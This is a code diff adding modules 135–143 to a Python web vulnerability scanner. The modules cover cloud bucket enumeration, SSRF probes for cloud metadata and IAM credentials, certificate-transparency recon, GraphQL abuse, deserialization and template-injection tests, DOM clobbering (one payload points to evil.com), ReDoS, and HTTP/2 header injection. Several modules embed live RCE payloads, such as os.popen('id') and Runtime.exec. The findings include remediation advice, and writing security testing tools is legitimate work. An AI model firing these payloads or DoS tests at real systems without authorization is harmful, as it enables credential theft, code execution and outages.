+    bucket_guesses = [
+        org, f"{org}-backup", f"{org}-data", f"{org}-assets",
+        f"{org}-static", f"{org}-media", f"{org}-files", f"{org}-uploads",
+        f"{org}-dev", f"{org}-prod", f"{org}-staging", f"{org}-private",
+        f"{org}-public", f"{org}-cdn", f"{org}-logs", f"{org}-reports",
+        host.replace(".","-"), host.replace(".",""),
+    ]
+
+    # S3 endpoints
+    s3_regions = ["us-east-1","us-west-2","eu-west-1","ap-southeast-1"]
+    s3_signs   = ["ListBucketResult","Contents","KeyCount","NoSuchBucket"]
+    s3_public   = ["ListBucketResult","<Contents>"]
+
+    for bucket in bucket_guesses[:8]:
+        # Test AWS S3
+        for region in s3_regions[:2]:
+            s3_url = f"https://{bucket}.s3.{region}.amazonaws.com/"
+            try:
+                r = SESSION.get(s3_url, timeout=TIMEOUT, verify=False)
+                if r.status_code == 200 and any(s in r.text for s in s3_public):
+                    # Count files
+                    file_count = r.text.count("<Key>")
+                    add("cloud_storage", {
+                        "type": "Public S3 Bucket",
+                        "severity": "Critical",
+                        "url": s3_url,
+                        "bucket": bucket,
+                        "files": file_count,
+                        "region": region,
+                        "detail": f"S3 bucket '{bucket}' in {region} is publicly readable — {file_count} objects visible",
+                        "remediation": (
+                            "1. Set bucket ACL to private\n"
+                            "2. Enable S3 Block Public Access\n"
+                            "3. Use bucket policies to restrict access\n"
+                            "4. Enable S3 access logging and CloudTrail"),
+                    })
+                    vuln(f"Public S3 Bucket: {s3_url} ({file_count} files)", "Critical")
+                    found = True
+                elif r.status_code == 200 and "AccessDenied" not in r.text:
+                    info(f"  S3: bucket '{bucket}' exists but private")
+            except Exception:
+                pass
+
+        # Test GCS (Google Cloud Storage)
+        gcs_url = f"https://storage.googleapis.com/{bucket}/"
+        try:
+            r = SESSION.get(gcs_url, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200 and ("ListBucketResult" in r.text or "<item>" in r.text):
+                add("cloud_storage", {
+                    "type": "Public GCS Bucket",
+                    "severity": "Critical",
+                    "url": gcs_url,
+                    "bucket": bucket,
+                    "detail": f"GCS bucket '{bucket}' is publicly readable",
+                    "remediation": (
+                        "1. Remove allUsers/allAuthenticatedUsers from bucket IAM\n"
+                        "2. Enable Uniform Bucket-Level Access\n"
+                        "3. Audit bucket permissions regularly"),
+                })
+                vuln(f"Public GCS Bucket: {gcs_url}", "Critical")
+                found = True
+        except Exception:
+            pass
+
+        # Test Azure Blob Storage
+        azure_url = f"https://{bucket}.blob.core.windows.net/$web?restype=container&comp=list"
+        try:
+            r = SESSION.get(azure_url, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200 and ("EnumerationResults" in r.text or "<Blobs>" in r.text):
+                add("cloud_storage", {
+                    "type": "Public Azure Blob Container",
+                    "severity": "Critical",
+                    "url": azure_url,
+                    "account": bucket,
+                    "detail": f"Azure Blob container '{bucket}' is publicly readable",
+                    "remediation": (
+                        "1. Set container access to Private\n"
+                        "2. Use SAS tokens for authorized access\n"
+                        "3. Enable Azure Defender for Storage"),
+                })
+                vuln(f"Public Azure Blob: {azure_url}", "Critical")
+                found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("Cloud Storage: No public cloud buckets found")
+    _module_done("cloud_storage")
+
+
+# ═══ MODULE 136 — AWS IMDS / SSRF CHAIN (v15.0) ══════════════════
+def aws_imds_ssrf_scan(url):
+    """MODULE 136 — AWS IMDSv1 SSRF via URL parameters and headers."""
+    if _module_skip("aws_imds"):
+        info("Skipping AWS IMDS SSRF (already done)"); return
+    section("MODULE 136 — AWS IMDS SSRF CHAIN","☁")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+
+    # Cloud metadata endpoints
+    metadata_urls = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/meta-data/hostname",
+        "http://[::ffff:169.254.169.254]/latest/meta-data/",  # IPv6-mapped
+        "http://169.254.169.254.nip.io/latest/meta-data/",    # DNS rebind
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+        "http://169.254.169.254/metadata/v1/",                # DigitalOcean
+        "http://100.100.100.200/latest/meta-data/",           # Alibaba Cloud
+        "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
+    ]
+
+    # SSRF params to try
+    ssrf_params = list(params.keys()) if params else []
+    ssrf_params += ["url","redirect","next","target","src","source","fetch",
+                    "load","path","data","resource","page","file","img","image"]
+    ssrf_params = list(set(ssrf_params))
+
+    imds_signs = ["ami-id","instance-id","security-credentials","meta-data",
+                  "hostname","availability-zone","computeMetadata",
+                  "serviceaccounts","iam/","local-hostname",
+                  "AccessKeyId","SecretAccessKey","Token","Expiration"]
+
+    for pname in ssrf_params[:5]:
+        for meta_url in metadata_urls[:5]:
+            ep = f"{base}{parsed.path}?{pname}={_ue(meta_url)}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                if any(s.lower() in resp_l for s in imds_signs):
+                    sev = "Critical"
+                    add("aws_imds", {
+                        "type": "SSRF → AWS IMDS / Cloud Metadata",
+                        "severity": sev,
+                        "url": ep,
+                        "param": pname,
+                        "metadata_url": meta_url,
+                        "detail": (
+                            f"SSRF via param '{pname}' fetches cloud metadata from {meta_url}. "
+                            "If IAM credentials are exposed, full AWS account takeover is possible."),
+                        "remediation": (
+                            "1. Upgrade to IMDSv2 (require PUT token for metadata access)\n"
+                            "2. Validate and restrict all URL parameters\n"
+                            "3. Block 169.254.169.254 at network level for web servers\n"
+                            "4. Use VPC endpoint policies to restrict IMDS access\n"
+                            "5. Implement SSRF-safe URL fetcher (allowlist of domains)"),
+                    })
+                    vuln(f"SSRF → Cloud IMDS via param '{pname}'", sev)
+                    found = True
+                    break
+            except Exception:
+                pass
+
+    # Also test via HTTP headers (SSRF via Host/Referer/X-Forwarded)
+    for meta_url in metadata_urls[:3]:
+        try:
+            r = SESSION.get(url, timeout=TIMEOUT, verify=False,
+                           headers={"X-Forwarded-For": "169.254.169.254",
+                                    "X-Real-IP": "169.254.169.254"})
+            if any(s.lower() in r.text.lower() for s in imds_signs):
+                add("aws_imds", {
+                    "type": "SSRF via Header → Cloud Metadata",
+                    "severity": "Critical",
+                    "url": url,
+                    "detail": "Cloud metadata accessible via IP spoofing headers",
+                    "remediation": "Do not use X-Forwarded-For for server-side requests. Use IMDSv2.",
+                })
+                vuln("SSRF via Header → Cloud Metadata", "Critical")
+                found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("AWS IMDS SSRF: No cloud metadata access via SSRF")
+    _module_done("aws_imds")
+
+
+# ═══ MODULE 137 — CERTIFICATE TRANSPARENCY RECON (v15.0) ══════════
+def cert_transparency_recon(url):
+    """MODULE 137 — Passive subdomain discovery via Certificate Transparency logs."""
+    if _module_skip("cert_trans"):
+        info("Skipping Certificate Transparency Recon (already done)"); return
+    section("MODULE 137 — CERTIFICATE TRANSPARENCY RECON (Passive)","🔍")
+    parsed = _up(url)
+    host   = parsed.netloc.split(":")[0]
+    parts  = host.split(".")
+    domain = ".".join(parts[-2:]) if len(parts)>1 else host
+    found  = False
+
+    try:
+        # Query crt.sh API
+        ct_url = f"https://crt.sh/?q=%.{domain}&output=json"
+        info(f"  CT Recon: querying crt.sh for *.{domain}")
+        r = SESSION.get(ct_url, timeout=15, verify=False)
+        if r.status_code == 200:
+            try:
+                entries = json.loads(r.text)
+                subdomains = set()
+                for e in entries:
+                    name = e.get("name_value","").lower()
+                    for sub in name.split("\n"):
+                        sub = sub.strip().lstrip("*.")
+                        if sub and sub.endswith(domain) and sub != domain:
+                            subdomains.add(sub)
+                # Look for sensitive subdomains
+                sensitive = [s for s in subdomains if any(
+                    kw in s for kw in ["admin","api","dev","staging","test","beta",
+                                       "internal","vpn","mail","ftp","ssh","db",
+                                       "database","backup","secret","private","corp",
+                                       "intranet","confluence","jira","jenkins","git",
+                                       "gitlab","github","sonar","kibana","elastic"])]
+                common = sorted(subdomains)[:30]
+                if subdomains:
+                    add("cert_trans", {
+                        "type": "Certificate Transparency — Subdomains Discovered",
+                        "severity": "Info",
+                        "url": f"https://crt.sh/?q=%.{domain}",
+                        "domain": domain,
+                        "total_found": len(subdomains),
+                        "sensitive": sensitive[:10],
+                        "sample": common[:15],
+                        "detail": (
+                            f"CT logs reveal {len(subdomains)} unique subdomains for {domain}. "
+                            f"Sensitive ones: {sensitive[:5]}. "
+                            "These are passive findings — no active scanning required."),
+                        "remediation": (
+                            "1. Audit all discovered subdomains for exposed services\n"
+                            "2. Remove unused/decommissioned subdomains from DNS\n"
+                            "3. Avoid creating obvious subdomain names for internal services\n"
+                            "4. Test all discovered subdomains with this scanner"),
+                    })
+                    info(f"  CT Recon: {len(subdomains)} subdomains, {len(sensitive)} sensitive")
+                    if sensitive:
+                        vuln(f"CT Recon: sensitive subdomains exposed: {sensitive[:5]}", "Medium")
+                        found = True
+                    else:
+                        good(f"CT Recon: {len(subdomains)} subdomains found (no obviously sensitive ones)")
+            except Exception as _e:
+                warn(f"CT Recon parse error: {_e}")
+    except Exception as _e:
+        warn(f"CT Recon error: {_e}")
+
+    if not found:
+        good("Certificate Transparency: Recon complete")
+    _module_done("cert_trans")
+
+
+# ═══ MODULE 138 — GRAPHQL DEEP TESTING (v15.0) ════════════════════
+def graphql_deep_scan(url):
+    """MODULE 138 — GraphQL: Introspection, batching DoS, field suggestion, injection."""
+    if _module_skip("graphql_deep"):
+        info("Skipping GraphQL Deep (already done)"); return
+    section("MODULE 138 — GRAPHQL DEEP TESTING","⬡")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    gql_paths = ["/graphql","/api/graphql","/graphql/api","/gql","/api/gql",
+                 "/v1/graphql","/v2/graphql","/graph","/graphiql","/playground"]
+
+    hdrs = {"Content-Type":"application/json","Accept":"application/json"}
+    gql_ep = None
+
+    # Find GraphQL endpoint
+    for path in gql_paths:
+        try:
+            r = SESSION.post(base+path, json={"query":"{__typename}"},
+                             headers=hdrs, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200 and ("__typename" in r.text or "data" in r.text):
+                gql_ep = base + path
+                info(f"  GraphQL: endpoint found at {gql_ep}")
+                break
+        except Exception:
+            pass
+
+    if not gql_ep:
+        good("GraphQL Deep: No GraphQL endpoint found")
+        _module_done("graphql_deep"); return
+
+    # Test 1: Full introspection schema dump
+    introspection_q = """{"query":"{ __schema { queryType { name } mutationType { name }
+      types { name kind fields { name args { name type { name kind ofType { name }}} } } } }"}"""
+    try:
+        r = SESSION.post(gql_ep, data=introspection_q.encode(),
+                         headers=hdrs, timeout=TIMEOUT, verify=False)
+        if r.status_code == 200 and "__schema" in r.text:
+            schema_size = len(r.text)
+            # Look for sensitive types
+            sensitive_types = ["User","Admin","Password","Token","Secret","Config",
+                               "Payment","CreditCard","ApiKey","AuthToken"]
+            exposed = [t for t in sensitive_types if t in r.text]
+            add("graphql_deep", {
+                "type": "GraphQL Introspection Enabled",
+                "severity": "Medium",
+                "url": gql_ep,
+                "schema_size": schema_size,
+                "sensitive_types": exposed[:5],
+                "detail": f"GraphQL introspection exposes full schema ({schema_size} bytes). Sensitive types: {exposed[:5]}",
+                "remediation": (
+                    "1. Disable introspection in production\n"
+                    "2. Use schema allowlisting\n"
+                    "3. Implement query depth limiting\n"
+                    "4. Add query complexity analysis"),
+            })
+            vuln(f"GraphQL Introspection enabled — {len(exposed)} sensitive types exposed", "Medium")
+            found = True
+    except Exception:
+        pass
+
+    # Test 2: Batching DoS attack
+    try:
+        batch_size = 100
+        batch_payload = json.dumps([{"query":"{__typename}"}] * batch_size)
+        t0 = time.time()
+        r = SESSION.post(gql_ep, data=batch_payload.encode(),
+                         headers=hdrs, timeout=30, verify=False)
+        elapsed_t = time.time() - t0
+        if r.status_code == 200 and elapsed_t > 2:
+            add("graphql_deep", {
+                "type": "GraphQL Batching DoS",
+                "severity": "High",
+                "url": gql_ep,
+                "batch_size": batch_size,
+                "elapsed": f"{elapsed_t:.2f}s",
+                "detail": f"GraphQL accepts {batch_size}-query batch in {elapsed_t:.2f}s — amplified DoS possible without rate limiting",
+                "remediation": (
+                    "1. Limit batch size (max 10 queries per batch)\n"
+                    "2. Implement query complexity scoring\n"
+                    "3. Add per-user rate limiting\n"
+                    "4. Set request timeout"),
+            })
+            vuln(f"GraphQL Batching DoS — {batch_size} queries accepted ({elapsed_t:.1f}s)", "High")
+            found = True
+    except Exception:
+        pass
+
+    # Test 3: Field suggestion (reveals hidden fields)
+    try:
+        r = SESSION.post(gql_ep, json={"query":"{user{pasword}}"},  # typo
+                         headers=hdrs, timeout=TIMEOUT, verify=False)
+        if "suggestion" in r.text.lower() or "did you mean" in r.text.lower():
+            import re as _re2
+            suggestions = _re2.findall(r'"([^"]+)"[^"]*suggestion|did you mean[^"]*"([^"]+)"',
+                                       r.text, _re2.IGNORECASE)
+            add("graphql_deep", {
+                "type": "GraphQL Field Suggestion Enabled",
+                "severity": "Low",
+                "url": gql_ep,
+                "detail": "GraphQL suggests correct field names on typos — reveals hidden schema fields to attackers",
+                "remediation": "Disable field suggestions in production GraphQL configuration.",
+            })
+            found = True
+    except Exception:
+        pass
+
+    # Test 4: GraphQL injection via variables
+    injection_queries = [
+        '{"query":"query($id:ID!){user(id:$id){name email}}","variables":{"id":"1 OR 1=1"}}',
+        '{"query":"{user(username:\\"admin\\"){id name email role}}"}',
+        '{"query":"{users{id name email password}}"}',  # Overfetching
+    ]
+    for q in injection_queries:
+        try:
+            r = SESSION.post(gql_ep, data=q.encode(), headers=hdrs,
+                             timeout=TIMEOUT, verify=False)
+            resp_l = r.text.lower()
+            if ("password" in resp_l or "email" in resp_l) and "data" in resp_l:
+                add("graphql_deep", {
+                    "type": "GraphQL Data Overfetching / Injection",
+                    "severity": "High",
+                    "url": gql_ep,
+                    "query": q[:100],
+                    "detail": "GraphQL returns sensitive fields (password/email) without authorization check",
+                    "remediation": (
+                        "1. Implement field-level authorization\n"
+                        "2. Never expose password hashes via GraphQL\n"
+                        "3. Use persisted queries only in production"),
+                })
+                vuln("GraphQL Data Overfetching — sensitive fields exposed", "High")
+                found = True
+                break
+        except Exception:
+            pass
+
+    if not found:
+        good("GraphQL Deep: No critical GraphQL vulnerabilities found")
+    _module_done("graphql_deep")
+
+
+# ═══ MODULE 139 — DESERIALIZATION DETECTION (v15.0) ═══════════════
+def deserialization_scan(url):
+    """MODULE 139 — Java/PHP/Python deserialization gadget detection."""
+    if _module_skip("deserial_deep"):
+        info("Skipping Deserialization Deep (already done)"); return
+    section("MODULE 139 — DESERIALIZATION GADGET DETECTION","⚙")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    # Magic bytes for serialized objects
+    java_magic   = b"\xac\xed\x00\x05"       # Java serialization magic
+    php_serial   = b'O:8:"stdClass"'          # PHP serialized object
+    python_pickle = b"\x80\x04\x95"           # Python pickle protocol 4
+    ruby_marshal  = b"\x04\x08"               # Ruby Marshal
+
+    # Detection via error messages
+    deser_error_signs = [
+        "java.io.","objectinputstream","classnotfound","deserializ",
+        "unserialize","pickle","marshal.loads","readobject",
+        "gadget chain","ysoserial","commons-collections",
+        "InvalidClassException","ClassCastException",
+        "StreamCorruptedException","NotSerializableException",
+    ]
+
+    # Payloads that trigger errors (safe — no actual RCE)
+    test_payloads = [
+        # Truncated Java payload (causes StreamCorruptedException)
+        ("java",   b"\xac\xed\x00\x05sr\x00\x0bTest",
+         "application/octet-stream"),
+        # PHP unserialize with bad class
+        ("php",    b'O:7:"TESTING":0:{}',
+         "application/x-www-form-urlencoded"),
+        # Python pickle with invalid data
+        ("python", b"\x80\x04\x95TESTING",
+         "application/octet-stream"),
+    ]
+
+    # Endpoints likely to accept serialized data
+    deser_endpoints = [
+        base+"/api/deserialize",
+        base+"/api/object",
+        base+"/api/data",
+        base+"/rmi",
+        base+"/jmx",
+        base+"/api/session",
+        base+"/session/restore",
+        base+"/api/import",
+        base+"/api/batch",
+    ]
+
+    for ep in deser_endpoints:
+        for lang, payload, ct in test_payloads:
+            try:
+                r = SESSION.post(ep, data=payload,
+                                 headers={"Content-Type":ct},
+                                 timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in deser_error_signs):
+                    add("deserial_deep", {
+                        "type": f"Deserialization Endpoint ({lang.upper()})",
+                        "severity": "Critical",
+                        "url": ep,
+                        "language": lang,
+                        "detail": (
+                            f"{lang.upper()} deserialization error detected at {ep}. "
+                            "If using vulnerable gadget chains (CommonsCollections, Spring, etc.), "
+                            "this enables Remote Code Execution."),
+                        "remediation": (
+                            "1. Never deserialize untrusted data\n"
+                            "2. Use allowlist of safe classes (Java: look-ahead ObjectInputStream)\n"
+                            "3. Update all libraries (ysoserial gadget chains in old Commons)\n"
+                            "4. Use data formats instead of serialization (JSON, Protobuf)\n"
+                            "5. Implement RASP to block deserialization gadget execution"),
+                    })
+                    vuln(f"{lang.upper()} Deserialization endpoint at {ep}", "Critical")
+                    found = True
+                    break
+            except Exception:
+                pass
+
+    # Also check response headers/cookies for serialization signs
+    try:
+        r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        # Check cookies for base64-encoded serialized objects
+        for name, val in SESSION.cookies.items():
+            try:
+                import base64 as _b64
+                decoded = _b64.b64decode(val + "==")
+                if decoded[:4] == java_magic:
+                    add("deserial_deep", {
+                        "type": "Java Serialized Object in Cookie",
+                        "severity": "Critical",
+                        "url": url,
+                        "cookie": name,
+                        "detail": f"Cookie '{name}' contains Java serialized object (magic bytes AC ED 00 05). Full RCE via ysoserial gadget chains.",
+                        "remediation": "Replace Java serialization cookies with signed JSON/JWT tokens. Never deserialize cookie values.",
+                    })
+                    vuln(f"Java Serialized Object in cookie '{name}'", "Critical")
+                    found = True
+                elif decoded[:2] == ruby_marshal:
+                    add("deserial_deep", {
+                        "type": "Ruby Marshal Object in Cookie",
+                        "severity": "Critical",
+                        "url": url,
+                        "cookie": name,
+                        "detail": f"Cookie '{name}' contains Ruby Marshal object — RCE possible",
+                        "remediation": "Never use Marshal.load on cookies. Use signed JSON instead.",
+                    })
+                    vuln(f"Ruby Marshal Object in cookie '{name}'", "Critical")
+                    found = True
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+    if not found:
+        good("Deserialization: No deserialization vulnerabilities detected")
+    _module_done("deserial_deep")
+
+
+# ═══ MODULE 140 — ADVANCED TEMPLATE INJECTION (v15.0) ═════════════
+def advanced_ssti_scan(url):
+    """MODULE 140 — SSTI: Jinja2, Twig, Freemarker, Smarty, Pebble specific payloads."""
+    if _module_skip("ssti_adv"):
+        info("Skipping Advanced SSTI (already done)"); return
+    section("MODULE 140 — ADVANCED TEMPLATE INJECTION","🧮")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+
+    # Engine-specific detection payloads
+    engine_payloads = [
+        # (engine, detection_payload, expected_output, rce_payload)
+        ("Jinja2",     "{{7*7}}",             "49",
+         "{{config.items()}}"),
+        ("Jinja2",     "{{7*'7'}}",           "7777777",
+         "{{''.__class__.__mro__[1].__subclasses__()}}"),
+        ("Twig",       "{{7*7}}",             "49",
+         "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
+        ("Freemarker", "${7*7}",              "49",
+         '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'),
+        ("Smarty",     "{$smarty.version}",   "Smarty",
+         "{php}echo `id`;{/php}"),
+        ("Pebble",     "{{7*7}}",             "49",
+         '{%for i in 1..1%}{{i.class.forName("java.lang.Runtime")}}'),
+        ("Velocity",   "#set($x=7*7)$x",     "49",
+         '#set($e="e")#set($a=$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class))'),
+        ("Mako",       "${7*7}",              "49",
+         '${7*7}'),
+        ("ERB",        "<%= 7*7 %>",          "49",
+         '<%= `id` %>'),
+        ("Tornado",    "{{ 7*7 }}",           "49",
+         "{% import os %}{{ os.popen('id').read() }}"),
+    ]
+
+    test_params = list(params.keys())[:3] if params else ["name","search","q","msg","template","text","input"]
+
+    for pname in test_params:
+        for engine, detect_payload, expected, rce_payload in engine_payloads:
+            ep = f"{base}{parsed.path}?{pname}={_ue(detect_payload)}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                resp_text = r.text
+                # Check if math was evaluated
+                if expected in resp_text:
+                    sev = "Critical"
+                    add("ssti_adv", {
+                        "type": f"SSTI — {engine} Template Injection",
+                        "severity": sev,
+                        "url": ep,
+                        "engine": engine,
+                        "param": pname,
+                        "payload": detect_payload,
+                        "expected": expected,
+                        "rce_payload": rce_payload,
+                        "detail": (
+                            f"{engine} template injection confirmed: '{detect_payload}' → '{expected}'. "
+                            f"RCE payload for testing: {rce_payload[:80]}. "
+                            "Full server compromise possible."),
+                        "remediation": (
+                            "1. Never render user input as a template\n"
+                            f"2. Use {engine} sandboxed environment\n"
+                            "3. Validate and escape all template inputs\n"
+                            "4. Use logic-less templates (Mustache, Handlebars)\n"
+                            "5. Run template engine in a container with no shell access"),
+                    })
+                    vuln(f"{engine} SSTI: '{detect_payload}'→'{expected}' on param '{pname}'", sev)
+                    found = True
+            except Exception:
+                pass
+        if found: break
+
+    if not found:
+        good("Advanced SSTI: No template injection found")
+    _module_done("ssti_adv")
+
+
+# ═══ MODULE 141 — DOM CLOBBERING (v15.0) ══════════════════════════
+def dom_clobbering_scan(url):
+    """MODULE 141 — DOM Clobbering vulnerability detection."""
+    if _module_skip("dom_clobber"):
+        info("Skipping DOM Clobbering (already done)"); return
+    section("MODULE 141 — DOM CLOBBERING","🧱")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    # DOM Clobbering payloads — HTML injected as content that clobbers JS globals
+    clobber_payloads = [
+        '<form id="config"><input id="debug" value="true"></form>',
+        '<a id="config" href="javascript:alert(1)">x</a>',
+        '<img id="GLOBALS" src=x>',
+        '<form id="x"><input id="length" value="999"></form>',
+        '<form name="document"><input name="cookie" value="clobbered"></form>',
+        '<a id="baseElement" href="https://evil.com/">x</a>',
+    ]
+
+    # Look for HTML reflection points
+    reflect_params = list(parse_qs(parsed.query).keys()) if parsed.query else ["q","search","content","msg","name"]
+
+    for pname in reflect_params[:3]:
+        for payload in clobber_payloads[:3]:
+            ep = f"{base}{parsed.path}?{pname}={_ue(payload)}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                # Check if HTML was reflected unescaped
+                if payload[:20].lower().replace("&lt;","<") in r.text.lower():
+                    add("dom_clobber", {
+                        "type": "DOM Clobbering",
+                        "severity": "Medium",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "detail": (
+                            f"HTML injected via param '{pname}' — DOM Clobbering possible. "
+                            "Attacker can overwrite JS globals, prototype properties, "
+                            "or configuration objects by injecting named HTML elements."),
+                        "remediation": (
+                            "1. Sanitize HTML with DOMPurify (use SANITIZE_DOM option)\n"
+                            "2. Avoid using document.getElementById for config/security values\n"
+                            "3. Use explicit variable declarations, not implicit window properties\n"
+                            "4. Apply Content-Security-Policy to restrict inline scripts"),
+                    })
+                    vuln(f"DOM Clobbering via param '{pname}'", "Medium")
+                    found = True
+                    break
+            except Exception:
+                pass
+
+    # Also check if page uses vulnerable patterns
+    try:
+        r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        vulnerable_patterns = [
+            "document.getElementById(",
+            "window.config",
+            "document.forms[",
+            "document.links[",
+            "document.anchors[",
+        ]
+        resp_l = r.text.lower()
+        dom_patterns = [p for p in vulnerable_patterns if p.lower() in resp_l]
+        if dom_patterns:
+            add("dom_clobber", {
+                "type": "Potential DOM Clobbering Attack Surface",
+                "severity": "Low",
+                "url": url,
+                "patterns": dom_patterns[:3],
+                "detail": f"Page uses DOM patterns vulnerable to clobbering: {dom_patterns[:3]}. Manual testing recommended.",
+                "remediation": "Avoid using document.getElementById for security-sensitive values without fallback type checks.",
+            })
+            found = True
+    except Exception:
+        pass
+
+    if not found:
+        good("DOM Clobbering: No DOM clobbering attack surface found")
+    _module_done("dom_clobber")
+
+
+# ═══ MODULE 142 — REDOS / EVIL REGEX (v15.0) ══════════════════════
+def redos_scan(url):
+    """MODULE 142 — ReDoS (Regular Expression Denial of Service) detection."""
+    if _module_skip("redos"):
+        info("Skipping ReDoS (already done)"); return
+    section("MODULE 142 — REDOS — REGEX DENIAL OF SERVICE","🐢")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+
+    # ReDoS payloads — designed to trigger catastrophic backtracking
+    redos_payloads = [
+        "a" * 30 + "!",                    # (a+)+ type backtracking
+        "a" * 25 + "b" * 25 + "!",         # (a|aa)+ type
+        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX", # Simple catastrophic
+        "a@" + "a" * 20 + ".com" + "!",   # Email regex
+        "1" * 20 + ".",                     # Number regex
+        "'" + "or " * 20 + "1=1",          # SQL-like in string
+        "a" * 40,                           # Simple repeat
+        "(" * 15 + "a" * 10 + ")" * 15,   # Nested groups
+        "^" * 5 + "a" * 20,               # Anchored
+    ]
+
+    # Test: send payload and measure response time vs baseline
+    test_params = list(params.keys())[:3] if params else ["email","username","search","query","input","pattern","regex","filter"]
+
+    try:
+        # Baseline timing
+        t0 = time.time()
+        SESSION.get(url, timeout=TIMEOUT, verify=False)
+        baseline = time.time() - t0
+    except Exception:
+        baseline = 1.0
+
+    for pname in test_params:
+        for payload in redos_payloads:
+            ep = f"{base}{parsed.path}?{pname}={_ue(payload)}"
+            try:
+                t0 = time.time()
+                r = SESSION.get(ep, timeout=15, verify=False)
+                elapsed = time.time() - t0
+                # If response takes significantly longer than baseline — potential ReDoS
+                if elapsed > baseline * 3 and elapsed > 2.0:
+                    add("redos", {
+                        "type": "ReDoS — Regex Denial of Service",
+                        "severity": "High",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload[:50],
+                        "baseline_time": f"{baseline:.2f}s",
+                        "redos_time": f"{elapsed:.2f}s",
+                        "detail": (
+                            f"ReDoS detected on param '{pname}': baseline {baseline:.2f}s → "
+                            f"payload {elapsed:.2f}s ({elapsed/baseline:.1f}x slower). "
+                            "Vulnerable regex can be used to DoS the server with a single request."),
+                        "remediation": (
+                            "1. Audit all regex patterns for catastrophic backtracking\n"
+                            "2. Use linear-time regex engines (RE2, Oniguruma with timeout)\n"
+                            "3. Set regex timeout/step limits\n"
+                            "4. Use safe-regex npm package to detect vulnerable patterns\n"
+                            "5. Rate-limit endpoints that do regex matching"),
+                    })
+                    vuln(f"ReDoS on param '{pname}' — {elapsed:.1f}s vs {baseline:.1f}s baseline", "High")
+                    found = True
+                    break
+            except Exception:
+                pass
+
+    if not found:
+        good("ReDoS: No regex denial of service detected")
+    _module_done("redos")
+
+
+# ═══ MODULE 143 — HTTP/2 ATTACKS (v15.0) ══════════════════════════
+def http2_attack_scan(url):
+    """MODULE 143 — HTTP/2: Header injection, rapid reset, downgrade."""
+    if _module_skip("http2_attack"):
+        info("Skipping HTTP/2 Attacks (already done)"); return
+    section("MODULE 143 — HTTP/2 HEADER INJECTION & ATTACKS","🚀")
+    parsed = _up(url)
+    found  = False
+
+    try:
+        # Check if HTTP/2 is supported
+        import httpx as _httpx
+        try:
+            client = _httpx.Client(http2=True, verify=False, timeout=TIMEOUT)
+            r = client.get(url)
+            if r.http_version == "HTTP/2":
+                info(f"  HTTP/2: server supports HTTP/2")
+                # Test HTTP/2 header injection via pseudo-headers
+                # Injecting CRLF in HTTP/2 headers (should be blocked but test it)
+                try:
+                    r2 = client.get(url, headers={
+                        "x-custom": "test\r\nX-Injected: evil\r\n",
+                        "x-forwarded-host": "evil.com",
+                    })
+                    if "X-Injected" in r2.text or "evil.com" in r2.text:
+                        add("http2_attack", {
+                            "type": "HTTP/2 Header Injection",
+                            "severity": "High",
+                            "url": url,
+                            "detail": "HTTP/2 server reflects injected header values — response splitting possible",
+                            "remediation": "Sanitize and validate all header values on HTTP/2 endpoints.",
+                        })
+                        vuln("HTTP/2 Header Injection", "High")
+                        found = True
+                except Exception:
+                    pass
+                # Note HTTP/2 Rapid Reset CVE-2023-44487
+                add("http2_attack", {
+                    "type": "HTTP/2 Rapid Reset Potential (CVE-2023-44487)",
+                    "severity": "Medium",
+                    "url": url,
+                    "detail": "Server uses HTTP/2 — verify it is patched against Rapid Reset DDoS (CVE-2023-44487). Unpatched servers can be overwhelmed with RST_STREAM frames.",
+                    "remediation": (
+                        "1. Update nginx/Apache/H2O/Go HTTP/2 libraries\n"
+                        "2. Apply OS-level patches for HTTP/2 Rapid Reset\n"
+                        "3. Enable rate limiting per connection\n"
+                        "4. Use CDN/WAF that handles Rapid Reset mitigation"),
+                })
+                found = True
+                good(f"HTTP/2: server confirmed — vulnerability notes added")
+            else:
+                info(f"  HTTP/2: server uses {r.http_version} (not HTTP/2)")
+                # Check if HTTP/2 downgrade possible
+                add("http2_attack", {
+                    "type": "HTTP/2 Not Enabled",
+                    "severity": "Info",
+                    "url": url,
+                    "detail": f"Server uses {r.http_version}. Consider enabling HTTP/2 for performance and security (ALPN negotiation).",
+                    "remediation": "Enable HTTP/2 in nginx/Apache. HTTP/2 prevents some HTTP/1.1-specific attacks.",
+                })
+            client.close()
+        except Exception as _he:
+            info(f"  HTTP/2: httpx test failed ({_he}) — checking via curl")
+            # Fallback: check via response headers
